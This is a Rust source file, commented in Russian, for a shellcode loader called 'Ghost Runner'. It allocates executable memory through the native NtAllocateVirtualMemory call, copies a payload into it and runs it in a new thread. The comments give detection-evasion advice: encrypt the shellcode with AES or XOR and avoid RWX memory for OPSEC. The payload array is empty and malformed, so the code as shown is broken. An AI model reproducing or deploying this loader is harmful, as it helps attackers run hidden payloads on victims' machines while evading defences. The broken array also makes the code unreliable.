use std::ffi::c_void;
use std::ptr;
use ntapi::ntmmapi::NtAllocateVirtualMemory;
use winapi::shared::ntdef::NULL;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{CreateThread, WaitForSingleObject};

fn main() {
    // Пейлоад для примера (калькулятор или NOPs).
    // В реальной задаче здесь должен быть зашифрованный (AES/XOR) массив байт.
    // Никогда не храните шеллкод в открытом виде в секции .data!
    let payload: [u8; 276] = [
        ,
    ];

    println!("[*] Ghost Runner: Native API initialization...");

    unsafe {
        // Подготовка аргументов для системного вызова
        let handle = -1isize as *mut c_void; // Pseudo handle (Current Process)
        let mut base_address: *mut c_void = ptr::null_mut();
        let mut region_size: usize = payload.len();
        let zero_bits = 0;

        // 1. Выделение памяти через NTDLL
        // Мы не просим kernel32.dll, мы идем к Native API
        let status = NtAllocateVirtualMemory(
            handle,
            &mut base_address,
            zero_bits,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE, // [OPSEC WARNING]: RWX память - это красный флаг.
                                    // Правильный путь: RW -> Copy -> RX (NtProtectVirtualMemory)
        );

        if status != 0 {
            panic!("[!] NtAllocateVirtualMemory failed with status: {:#x}", status);
        }
        
        println!("[+] Memory allocated at: {:p}", base_address);

        // 2. Копирование пейлоада
        // copy_nonoverlapping - это intrinsic, он очень быстр и не тянет зависимостей libc
        ptr::copy_nonoverlapping(
            payload.as_ptr(), 
            base_address as *mut u8, 
            payload.len()
        );
        
        println!("[+] Payload written to memory");

        // 3. Исполнение
        // Используем WinAPI для создания потока (для наглядности)
        let thread_handle = CreateThread(
            None,
            0,
            Some(std::mem::transmute(base_address)),
            None,
            0,
            None,
        );

        match thread_handle {
            Ok(h) => {
                println!("[!] Executing payload...");
                WaitForSingleObject(h, 0xFFFFFFFF);
            },
            Err(e) => panic!("[-] Execution failed: {:?}", e),
        }
    }
}
